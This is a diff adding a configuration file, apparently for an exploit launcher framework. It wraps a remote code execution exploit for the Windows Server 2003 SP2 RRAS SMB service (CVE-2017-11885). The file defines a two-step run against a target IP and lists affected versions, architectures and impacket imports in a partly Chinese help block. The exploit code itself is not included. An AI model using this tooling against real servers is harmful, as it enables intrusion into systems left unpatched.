@@ -1,0 +1,41 @@
+<bpf language=2.0>
+
+<method>inject</method>
+<connect>NB</connect>
+<sctype>yuan</sctype>
+<parameter1>IP</parameter1>
+<parameter2>系统架构</parameter2>
+
+<steps>2</steps>
+   <step1>
+      <cmd>change.exe <par2/></cmd>
+   </step1>
+   <step2>
+      <cmd>python run.py <par1/></cmd>
+   </step2>
+
+<help>
+Microsoft Windows 2003 SP2 - 'RRAS' SMB Remote Code Execution
+CVE-2017-11885
+
+影响版本：
+             Windows server 2003 SP2
+
+系统架构：
+             x86
+             x64
+
+------------------------------------------------
+Python import：
+
+import struct
+import sys
+import time
+import os
+from threading import Thread    
+from impacket import smb
+from impacket import uuid
+from impacket import dcerpc
+from impacket.dcerpc.v5 import transport
+
+</help>
